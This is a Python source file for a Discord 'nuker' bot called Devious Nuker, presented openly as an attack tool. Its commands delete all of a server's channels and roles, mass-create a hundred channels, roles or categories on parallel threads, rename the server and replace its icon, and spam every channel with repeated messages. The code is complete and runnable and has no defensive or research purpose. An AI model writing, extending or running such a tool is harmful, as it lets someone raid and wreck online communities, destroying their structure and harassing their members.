import os
import discord
from discord.ext import commands
import requests
import threading
import base64
import json
from colors import green, red, yellow, white, cyan, reset, blue, magenta


os.system("title Devious Nuker")


print("""%s
    ____            _                 
   / __ \___ _   __(_)___  __  _______
  / / / / _ \ | / / / __ \/ / / / ___/
 / /_/ /  __/ |/ / / /_/ / /_/ (__  ) 
/_____/\___/|___/_/\____/\__,_/____/  
                                       %s

                                Made by %shttps://github.com/ace120ms%s


""" % (cyan(), reset(), blue(), reset()))



with open("config.json") as f:
    config = json.load(f)

token = config.get("token")
prefix = config.get("prefix")



headers = {
    "authorization": f"Bot {token}"
}



intents = discord.Intents.all()
devious = commands.Bot(command_prefix=prefix, intents=intents)
devious.remove_command("help")



@devious.event
async def on_connect():
    print(f"\n [%s+%s] Connected to: {devious.user}\n [%s+%s] ID: {devious.user.id}\n [%s+%s] Prefix: {prefix}" % (yellow(), reset(), yellow(), reset(), yellow(), reset()))



@devious.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id

    def delete_channels(channel):
        requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)

    def create_channels():
        data = {
            "name": "destroyed by devious",
            "permission_overwrites": [],
            "type": 0
        }
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=data)

    for channel in ctx.guild.channels:
        threading.Thread(target=delete_channels, args=(channel.id,)).start()

    for i in range(100):
        threading.Thread(target=create_channels,).start()



@devious.command()
async def rdel(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id

    def delete_roles(role):
        requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)

    for role in ctx.guild.roles:
        threading.Thread(target=delete_roles, args=(role.id,)).start()



@devious.command()
async def rcr(ctx, *, role_name):
    await ctx.message.delete()
    guild = ctx.guild.id

    def create_roles():
        data = {
            "name": role_name,
            "color": 0
        }
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=data)

    for i in range(100):
        threading.Thread(target=create_roles,).start()



@devious.command()
async def ccr(ctx, *, channel_name):
    await ctx.message.delete()
    guild = ctx.guild.id

    def createchans():
        data = {
            "name": channel_name,
            "permission_overwrites": [],
            "type": 0
        }
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=data)

    for i in range(100):
        threading.Thread(target=createchans,).start()



@devious.command()
async def vccr(ctx, *, voice_channel_name):
    await ctx.message.delete()
    guild = ctx.guild.id

    def create_voice_channels():
        data = {
            "name": voice_channel_name,
            "permission_overwrites": [],
            "type": 2
        }
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=data)

    for i in range(100):
        threading.Thread(target=create_voice_channels,).start()



@devious.command()
async def cr(ctx, *, category_name):
    await ctx.message.delete()
    guild = ctx.guild.id

    def create_categories():
        data = {
            "name": category_name,
            "permission_overwrites": [],
            "type": 4
        }
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=data)

    for i in range(100):
        threading.Thread(target=create_categories,).start()



@devious.command()
async def rn(ctx, *, name):
    await ctx.message.delete()
    guild = ctx.guild.id
    data = {
        "name": name
    }
    requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=data)



@devious.command()
async def changeguildicon(ctx, url):
    await ctx.message.delete()
    guild = ctx.guild.id
    encode = base64.b64encode(requests.get(url).content).decode()
    data = {
        "icon": f"data:image`/jpg;base64,{encode}"
    }
    requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=data)



@devious.command()
async def spam(ctx, *, message):
    await ctx.message.delete()

    def message_spam(channel):
        data = {
            "content": message,
            "tts": False
        }
        requests.post(f"https://discord.com/api/v9/channels/{channel}/messages", headers=headers, json=data)

    for i in range(100):
        for channel in ctx.guild.channels:
            threading.Thread(target=message_spam, args=(channel.id,)).start()



@devious.command()
async def cdel(ctx):
    await ctx.message.delete()

    def delchans(channel):
        requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)

    for channel in ctx.guild.channels:
        threading.Thread(target=delchans, args=(channel.id,)).start()



@devious.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(
        title="devious Nuker Menù",
        description=f"""```
{prefix}nuke: To Delete channels and create channels <channels_name>
{prefix}spam: To spam in all channels <message>
{prefix}cdel: To delete all server channels
{prefix}rdel: To delete all server roles
{prefix}ccr: To create channels <channel_name>
{prefix}rcr: To create roles <roles_name>
{prefix}cr: To create categories <category_name>
{prefix}rn: To change guild name <guild_name>
{prefix}changeguildicon: To change guild icon <icon_url>```"""
    )
    await ctx.send(embed=embed)






devious.run(token)
